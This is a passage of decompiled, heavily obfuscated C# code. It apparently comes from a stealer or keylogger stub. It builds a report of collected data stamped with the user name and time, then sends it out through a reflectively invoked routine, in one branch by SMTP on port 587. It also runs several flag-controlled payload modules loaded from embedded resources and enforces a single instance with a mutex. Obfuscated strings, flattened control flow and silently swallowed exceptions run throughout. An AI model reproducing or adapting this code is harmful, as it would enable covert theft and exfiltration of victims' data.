            stringBuilder1.AppendLine(Conversions.ToString(\u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(2765), \u0023h.\u0023g(2838), new object[0])));
            goto label_65;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            goto label_65;
          }
        }
        else
          goto label_65;
label_81:
        stringBuilder1 = stringBuilder2;
        goto label_23;
      }
label_65:
      if (Operators.CompareString(stringBuilder1.ToString(), \u0023h.\u0023g(244), false) != 0)
      {
        string str1 = \u0023h.\u0023g(2851);
        string name = \u0023mb.\u0023jb().Name;
        string str2 = \u0023h.\u0023g(502);
        DateTime now = DateTime.Now;
        if (true)
          goto label_82;
label_68:
        DateTime dateTime;
        string str3 = dateTime.ToString();
        string str4 = str1 + name + str2 + str3;
        if (true)
          goto label_83;
label_69:
        string str5;
        if (\u0023xD.\u0023aG)
        {
          try
          {
            byte[] numArray = \u0023xD.\u00235F;
            string str6 = \u0023h.\u0023g(511);
            string str7 = \u0023h.\u0023g(564);
            object[] objArray1 = new object[5];
            if (true)
              goto label_72;
label_71:
            object[] objArray2;
            objArray2[0] = (object) \u0023h.\u0023g(573);
            objArray2[1] = (object) str5;
            objArray2[2] = (object) stringBuilder1.ToString();
            objArray2[3] = (object) false;
            objArray2[4] = (object) 1337;
            object[] objArray3 = objArray2;
            \u0023xD.\u0023VG(numArray, str6, str7, objArray3);
            goto label_78;
label_72:
            objArray2 = objArray1;
            goto label_71;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            goto label_78;
          }
        }
        else
        {
          try
          {
            byte[] numArray = \u0023xD.\u00235F;
            string str8 = \u0023h.\u0023g(586);
            string str9 = \u0023h.\u0023g(639);
            object[] objArray4 = new object[9];
            if (true)
              goto label_76;
label_75:
            object[] objArray5;
            objArray5[0] = (object) \u0023h.\u0023g(648);
            objArray5[1] = (object) \u0023h.\u0023g(681);
            objArray5[2] = (object) \u0023h.\u0023g(706);
            objArray5[3] = (object) 587;
            objArray5[4] = (object) str5;
            objArray5[5] = (object) stringBuilder1.ToString();
            objArray5[6] = (object) false;
            objArray5[7] = (object) 1337;
            objArray5[8] = (object) true;
            object[] objArray6 = objArray5;
            \u0023xD.\u0023VG(numArray, str8, str9, objArray6);
            goto label_78;
label_76:
            objArray5 = objArray4;
            goto label_75;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            goto label_78;
          }
        }
label_83:
        str5 = str4;
        goto label_69;
label_82:
        dateTime = now;
        goto label_68;
      }
label_78:
      if (!\u0023xD.\u0023LG)
        return;
      if (false)
        return;
      Environment.Exit(0);
    }

    public static void \u00232G()
    {
      if (\u0023xD.\u0023wG)
      {
        try
        {
          do
          {
            \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023Ob.\u00235G(\u0023h.\u0023g(2904), \u0023h.\u0023g(2977)), \u0023h.\u0023g(2986), new object[0]);
          }
          while (false);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      int num = \u0023xD.\u0023xG ? 1 : 0;
      if (true)
      {
        if (num != 0)
        {
          try
          {
            \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023Ob.\u00235G(\u0023h.\u0023g(2904), \u0023h.\u0023g(2977)), \u0023h.\u0023g(3003), new object[0]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023BG)
        {
          try
          {
            do
            {
              \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023Ob.\u00235G(\u0023h.\u0023g(2904), \u0023h.\u0023g(2977)), \u0023h.\u0023g(3008), new object[0]);
            }
            while (false);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023yG)
        {
          try
          {
            do
            {
              do
              {
                \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023Ob.\u00235G(\u0023h.\u0023g(2904), \u0023h.\u0023g(2977)), \u0023h.\u0023g(3021), new object[0]);
              }
              while (false);
            }
            while (false);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023AG)
        {
          try
          {
            \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023Ob.\u00235G(\u0023h.\u0023g(2904), \u0023h.\u0023g(2977)), \u0023h.\u0023g(3026), new object[0]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        num = \u0023xD.\u0023zG ? 1 : 0;
      }
      if (num != 0)
      {
        try
        {
          \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023Ob.\u00235G(\u0023h.\u0023g(2904), \u0023h.\u0023g(2977)), \u0023h.\u0023g(3047), new object[0]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (!\u0023xD.\u0023CG)
        return;
      try
      {
        \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023Ob.\u00235G(\u0023h.\u0023g(2904), \u0023h.\u0023g(2977)), \u0023h.\u0023g(3064), new object[0]);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static byte[] \u00233G([In] string obj0)
    {
      byte[] numArray1;
      try
      {
        do
        {
          MemoryStream memoryStream1;
          if (true)
          {
            Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(obj0);
            if (true)
              goto label_8;
label_2:
            Stream stream;
            byte[] numArray2 = new byte[(int) (stream.Length - 1L) + 1];
            if (true)
              goto label_9;
label_3:
            byte[] buffer;
            int num = stream.Read(buffer, 0, (int) stream.Length);
            if (true)
              goto label_10;
label_4:
            int count;
            if (true)
            {
              MemoryStream memoryStream2 = new MemoryStream(buffer, 0, count);
              if (true)
              {
                memoryStream1 = memoryStream2;
                goto label_6;
              }
              else
                goto label_6;
            }
            else
              goto label_6;
label_10:
            count = num;
            goto label_4;
label_9:
            buffer = numArray2;
            goto label_3;
label_8:
            stream = manifestResourceStream;
            goto label_2;
          }
label_6:
          byte[] array = memoryStream1.ToArray();
          if (true)
            goto label_12;
label_7:
          continue;
label_12:
          numArray1 = array;
          goto label_7;
        }
        while (false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        do
        {
          numArray1 = (byte[]) null;
          ProjectData.ClearProjectError();
        }
        while (false);
      }
      return numArray1;
    }

    public static void \u00234G()
    {
      try
      {
        do
        {
          Mutex mutex1 = new Mutex(false, \u0023h.\u0023g(3085));
          if (true)
            goto label_8;
label_1:
          Mutex mutex2;
          if (!mutex2.WaitOne(0, false))
          {
            Mutex mutex3 = mutex2;
            if (true)
              goto label_9;
label_3:
            continue;
label_9:
            mutex3.Close();
            goto label_3;
          }
          else
            goto label_13;
label_8:
          mutex2 = mutex1;
          goto label_1;
        }
        while (false);
        goto label_4;
label_13:
        return;
label_4:
        if (true)
          goto label_10;
label_5:
        if (false)
          return;
        if (false)
          return;
        Environment.Exit(0);
        return;
label_10:
        goto label_5;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
